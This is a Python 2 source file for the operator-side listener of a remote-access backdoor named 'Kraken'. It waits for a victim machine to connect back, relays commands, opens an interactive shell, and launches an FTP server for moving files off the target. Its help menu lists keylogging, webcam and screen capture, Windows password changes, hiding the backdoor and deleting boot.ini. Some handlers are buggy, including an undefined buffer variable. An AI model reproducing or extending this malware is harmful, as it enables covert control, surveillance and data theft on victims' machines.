#!/usr/bin/python2
#-*- coding:utf-8 -*-
# Author : Dxvistxr - Unamed
# server File

import socket
import colorama
import nclib
from datetime import datetime
import time
import random
import sys
import argparse
import os
import platform
from ftplib import FTP

banner1 = '''

 ██ ▄█▀ ██▀███   ▄▄▄       ██ ▄█▀▓█████  ███▄    █ 
 ██▄█▒ ▓██ ▒ ██▒▒████▄     ██▄█▒ ▓█   ▀  ██ ▀█   █ 
▓███▄░ ▓██ ░▄█ ▒▒██  ▀█▄  ▓███▄░ ▒███   ▓██  ▀█ ██▒
▓██ █▄ ▒██▀▀█▄  ░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒
▒██▒ █▄░██▓ ▒██▒ ▓█   ▓██▒▒██▒ █▄░▒████▒▒██░   ▓██░
▒ ▒▒ ▓▒░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒ 
░ ░▒ ▒░  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░
░ ░░ ░   ░░   ░   ░   ▒   ░ ░░ ░    ░      ░   ░ ░ 
░  ░      ░           ░  ░░  ░      ░  ░         ░ 
                                                   
'''

banner2 = '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .
                              :
                              .
'''

banner3 = '''

                        ___
                     .-'   `'.
                    /         \\
                    |         ;
                    |         |           ___.--,
           _.._     |0) ~ (0) |    _.---'`__.-( (_.
    __.--'`_.. '.__.\    '--. \_.-' ,.--'`     `""`
   ( ,.--'`   ',__ /./;   ;, '.__.'`    __
   _`) )  .---.__.' / |   |\   \__..--""  """--.,_
  `---' .'.''-._.-'`_./  /\ '.  \ _.-~~~````~~~-._`-.__.'
        | |  .' _.-' |  |  \  \  '.               `~---`
         \ \/ .'     \  \   '. '-._)
          \/ /        \  \    `=.__`~-.
         / /\         `) )    / / `"".`\\
    , _.-'.'\ \        / /    ( (     / /
     `--~`   ) )    .-'.'      '.'.  | (
            (/`    ( (`          ) )  '-;
             `      '-;         (-'

'''

banner4 = '''
██╗  ██╗██████╗  █████╗ ██╗  ██╗███████╗███╗   ██╗
██║ ██╔╝██╔══██╗██╔══██╗██║ ██╔╝██╔════╝████╗  ██║
█████╔╝ ██████╔╝███████║█████╔╝ █████╗  ██╔██╗ ██║
██╔═██╗ ██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██║╚██╗██║
██║  ██╗██║  ██║██║  ██║██║  ██╗███████╗██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
                                                  
'''

banner5 = '''
.-. .-')  _  .-')     ('-.    .-. .-')     ('-.       .-') _  
\  ( OO )( \( -O )   ( OO ).-.\  ( OO )  _(  OO)     ( OO ) ) 
,--. ,--. ,------.   / . --. /,--. ,--. (,------.,--./ ,--,'  
|  .'   / |   /`. '  | \-.  \ |  .'   /  |  .---'|   \ |  |\  
|      /, |  /  | |.-'-'  |  ||      /,  |  |    |    \|  | ) 
|     ' _)|  |_.' | \| |_.'  ||     ' _)(|  '--. |  .     |/  
|  .   \  |  .  '.'  |  .-.  ||  .   \   |  .--' |  |\    |   
|  |\   \ |  |\  \   |  | |  ||  |\   \  |  `---.|  | \   |   
`--' '--' `--' '--'  `--' `--'`--' '--'  `------'`--'  `--'   

'''

banner6 = '''
 _        _______  _______  _        _______  _       
| \    /\(  ____ )(  ___  )| \    /\(  ____ \( (    /|
|  \  / /| (    )|| (   ) ||  \  / /| (    \/|  \  ( |
|  (_/ / | (____)|| (___) ||  (_/ / | (__    |   \ | |
|   _ (  |     __)|  ___  ||   _ (  |  __)   | (\ \) |
|  ( \ \ | (\ (   | (   ) ||  ( \ \ | (      | | \   |
|  /  \ \| ) \ \__| )   ( ||  /  \ \| (____/\| )  \  |
|_/    \/|/   \__/|/     \||_/    \/(_______/|/    )_)
                                                      
'''

banner7 = '''
 __  _  ____    ____  __  _    ___  ____  
|  |/ ]|    \  /    ||  |/ ]  /  _]|    \ 
|  ' / |  D  )|  o  ||  ' /  /  [_ |  _  |
|    \ |    / |     ||    \ |    _]|  |  |
|     ||    \ |  _  ||     ||   [_ |  |  |
|  .  ||  .  \|  |  ||  .  ||     ||  |  |
|__|\_||__|\_||__|__||__|\_||_____||__|__|
                                          
                
                                          
'''

descrip = '''
                \033[1;96m[Kraken - By Dxvistxr]\033[00m


            \033[1;95m[ \033[1;96mAuthor : \033[1;96mDxvistxr    \033[1;95m]\033[00m
            \033[1;95m[ \033[1;96mGithub : \033[1;96mDxvistxr    \033[1;95m]\033[00m
            \033[1;95m[ \033[1;96mYoutube : \033[1;96mDxvistxr   \033[1;95m]\033[00m
            \033[1;95m[ \033[1;96mInstagram : \033[1;96mDxvistxr \033[1;95m]\033[00m
            \033[1;95m[ \033[1;96mVersion : \033[1;96m1.0        \033[1;95m]\033[00m

'''

def start_ftp_server(host,port,user,password,pathroot):
        try:
                check_ftp_server = os.path.exists('ftp_server.py')
                if check_ftp_server ==True:
                        print('\033[1;93m[\033[1;96m*\033[1;93m] FTP Server Found!')
                        os.system('python2 ftp_server.py %s %s %s %s %s > /dev/null 2>&1 &' % (host,port,user,password,pathroot)) 
                        print('\033[1;94m[\033[1;96m*\033[1;94m] FTP Server Started !')
                        print('\033[1;94m[\033[1;96m*\033[1;94m] FTP Host : %s' % (host))
                        print('\033[1;94m[\033[1;96m*\033[1;94m] FTP Port : %s' % (port))
                        print('\033[1;94m[\033[1;96m*\033[1;94m] FTP User : %s' % (user))
                        print('\033[1;94m[\033[1;96m*\033[1;94m] FTP Password : %s' % (password))
                        print('\033[1;94m[\033[1;96m*\033[1;94m] FTP PathRoot : %s' % (pathroot))
                else:
                        print('\033[1;96m[!] FTP Server Not Found !')
        
        except Exception as error_ftperror:
                print(error_ftperror)

def connect(LHOST,LPORT,ftphost,ftpport,ftpuser,ftppasswd,ftpproot):
        start_ftp_server(ftphost,ftpport,ftpuser,ftppasswd,ftpproot)
        print('\033[1;96m[\033[1;93m*\033[1;96m] Listening On %s:%s' % (LHOST,LPORT))
        nc = nclib.Netcat(listen=(LHOST,LPORT))
        data = nc.recv(1024)
        while True:
                try:
                        t = datetime.now().strftime('[%H:%M:%S]')
                        command = raw_input('\033[1;96m%s \033[1;94mshxll\033[1;94m@\033[1;96mKr4k3n$ \033[00m' % (t))
                        nc.send(command)
                        
                        if command.startswith('quit')==True:
                                os.system('pkill python2')
                                print('\033[1;96m[\033[1;93m*\033[1;96m] FTP Server Stoped !')
                                break
                        
                        elif command.startswith('shell')==True:
                                nc.interact()
                        
                        elif command.startswith('cd')==True:
                                path=command[3:]
                        
                        elif command.startswith('cat')==True:
                                filecmd=command[4:]
                        
                        elif command.startswith('clear')==True:
                                if 'Linux' not in platform.platform():
                                        os.system('cls')
                                
                                elif 'Windows' not in platform.platform():
                                        os.system('clear')
                        
                        elif command.startswith('del')==True:
                                file_delete=command[4:]
                        
                        elif command.startswith('rmpt')==True:
                                path_delete=command[5:]
                        
                        elif command.startswith('mkpa')==True:
                                path_create=command[5:]
                        
                        elif command.startswith('rname')==True:
                                rname_string=command[6:]
                        
                        elif command.startswith('ftpdownload')==True:
                                file_download_ftp=command[12:]
                        
                        elif command.startswith('ps')==True:
                                tasklist_data=nc.recv(65536)
                                while True:
                                        if not tasklist_data:
                                                break
                                        else:
                                                print(tasklist_data)
                                                tasklist_data=nc.recv(65536)
                        
                        elif command.startswith('ftpupload')==True:
                                filename=command[10:]
                                check_filename_is_in_ftp_server = os.path.exists(ftpproot+filename)
                                if check_filename_is_in_ftp_server ==True:
                                        pass
                                else:
                                        if 'Linux' not in platform.platform():
                                                os.system('move %s %s' % (filename,ftpproot))
                                                
                                        elif 'Windows' not in platform.platform():
                                                os.system('mv %s %s' % (filename,ftpproot))
                        

                        elif command.startswith('openurl')==True:
                                link=command[8:]
                        

                        elif command.startswith('copy')==True:
                                filename_copy=command[5:]
                        
                        elif command.startswith('move')==True:
                                filename_move=command[5:]
                        
                        elif command.startswith('xorencode')==True:
                                filename=command[10:]
                        
                        elif command.startswith('b64encode')==True:
                                filename_encode_b64=command[10:]
                        
                        elif command.startswith('b64decode')==True:
                                file_decode_b64=command[10:]
                        
                        elif command.startswith('portscan')==True:
                                data_sent=command[9:]
                                print('[*] Wait Moment Please Scanner Started !')
                                time.sleep(60)
                        

                        elif command.startswith('scan_network')==True:
                                time.sleep(5)
                        
                        elif command.startswith('cwpasswd')==True:
                                file_dt=command[9:]
                        
                        elif command.startswith('tkill')==True:
                                pid_killed=command[5:]
                        
                        elif command.startswith('msgbox')==True:
                                message=command[7:]
                        
                        elif command.startswith('meslp')==True:
                                message_loop=command[6:]
                        
                        elif command.startswith('scan_n_dump')==True:
                                time.sleep(2)
                        
                        elif command.startswith('sc_net_start')==True:
                                gateway=command[13:]
                        
                        elif command.startswith('process')==True:
                                processus=data[8:]
                        
                        elif command.startswith('ping')==True:
                                ip_target=data[5:]
                        
                        elif command.startswith('speak')==True:
                                message=data[6:]


                        
                        elif command.startswith('banner')==True:
                                choice_banner = [banner1,banner2,banner3,banner4,banner5,banner6,banner7]
                                choice_banner_print = random.choice(choice_banner)
                                print('\033[1;96m%s' % (choice_banner_print))
                                print(descrip)
                        
                        elif command.startswith('help')==True:
                                print('\033[1;96m[\033[1;93m*\033[1;96m] Backdoor - Kraken By Dxvistxr \033[1;96m[\033[1;93m*\033[1;96m]')
                                print(' commands               descriptions                                           compatible-platform')
                                print(' --------               ------------                                         -------------------')
                                print('   help                   Show Help                                                  multi')
                                print('   shell                  Open Interractive Shell (cmd,bash,sh..)                    multi')
                                print('   quit                   Quit Backdoor                                              multi')
                                print('   ipgeo                  IPGeo Target                                               multi')
                                print('   sysinfo                System Info                                                multi')
                                print('   pwd                    Show Current Path                                          multi')
                                print('   cd <path>              Change Dirrectory                                          multi')
                                print('   cat <filename>         Show Filename                                              multi')
                                print('   portscan <ip>          Scan Port On Target Machine Network                        multi')
                                print('   del <file>             Delete File                                                multi')
                                print('   rmpt <path>            Remove Path Or Folder                                      multi')
                                print('   mkpa <path>            Create Path Or Folder                                      multi')
                                print('   rname <old> <new>      Rename File Or Path                                        multi')
                                print('   move  <old> <new>      Move File Or Folder                                        multi')
                                print('   copy  <old> <new>      Copy File Or Folder                                        multi')
                                print('   xorencode <filename>   Encode Xor File                                            multi')
                                print('   b64encode  <file>      Encode File In Base64                                      multi')
                                print('   b64decode  <file>      Decode File In Base64                                      multi')
                                print('   keylogger_start        Start Keylogger                                            multi')
                                print('   keylogger_dump         Dump Keylogger Log                                         multi')
                                print('   keylogger_stop         Stop Keylogger                                             multi')
                                print('   openurl <link>         Open URL On Target Machine                                 multi')
                                print('   ftpdownload <file>     Download File With FTP                                     multi')
                                print('   ftpupload   <file>     Upload File With FTP                                       multi')
                                print('   webcamsnap             Take A Webcam Snap                                         multi')
                                print('   screenshot             Take ScreenShot                                            multi')
                                print('   cwpasswd <users> <new_passwd> If Not Know User enter %UserName% Change Win Passwd windows')
                                print('   netuser                Get Windows User List                                      windows')
                                print('   tkill  <proc_name>     Kill Process                                               multi')
                                print('   reboot                 Reboot Machine                                             multi')
                                print('   shutdown               Shutdown Machine                                           multi')
                                print('   ps                     Show Tasklist Of The Machine                               multi')
                                print('   clear                  Clear Console                                              multi')
                                print('   ls                     List Dirrectory                                            multi')
                                print('   dir                    List Dirrectory                                            multi')
                                print('   banner                 Show Banner                                                multi')
                                print('   whoami                 Get Whoami                                                 multi')
                                print('   ifconfig               Get Ifconfig                                               multi')
                                print('   msgbox <message>       Sent Message Box                                           windows')
                                print('   meslp  <message>       Sent Message Loop                                          windows')
                                print('   resettime              Reset Time                                                 windows')
                                print('   getpid                 Return PID                                                 multi')
                                print('   sc_net_start <gateway> Scan Network Host                                          multi')
                                print('   getgtw                 Return Gateway                                             multi')
                                print('   scan_n_dump            Return Host Connected (execute this after scan Netxork)    multi')
                                print('   process <process_name> Start Task Process exemple (firefox.exe) etc..             multi')
                                print('   opendiskloop           Open CD/DVD DISK In Loop                                   windows')
                                print('   odisk                  Open CD/DVD Disk And Close                                 windows')
                                print('   tlrestart              The Last Restart Bye Bye                                   windows')
                                print('   hide_backdoor          Hide Backdoor                                              windows')
                                print('   tlrestart              Dangerous Delete boot.ini                                  windows')
                                print('   ping                   Ping Machine IP                                              multi')
                                print('   speak <message>        Speak Voice TTS                                              multi')
                                print('   change_wallpaper       Change Wallpaper                                            windows')




                        
                        data = nc.recv(buffer)
                        print(data)
                
                except KeyboardInterrupt:
                        print('[*] CTRL + C')


def main():
        if sys.version[0] =='3':
                sys.exit('[*] Please Run Backdoor With Python2')

        choice_banner = [banner1,banner2,banner3,banner4,banner5,banner6,banner7]
        choice_banner_print = random.choice(choice_banner)
        print('\033[1;96m%s' % (choice_banner_print))
        print(descrip)
        parser = argparse.ArgumentParser()
        print('\033[1;93m')
        parser.add_argument('host',type=str, help='Set Host')
        parser.add_argument('port',type=int, help='Set Port')
        parser.add_argument('ftphost',type=str,help='Set FTP Host')
        parser.add_argument('ftpport',type=str,help='Set FTP Port')
        parser.add_argument('ftpuser',type=str,help='Set FTP User')
        parser.add_argument('ftppasswd',type=str,help='Set FTP Password')
        parser.add_argument('ftpproot',type=str,help='Set FTP PathRoot')
        args = parser.parse_args()
        print('\033[00m')
        connect(args.host,args.port,args.ftphost,args.ftpport,args.ftpuser,args.ftppasswd,args.ftpproot)

if __name__ == '__main__':
        main()
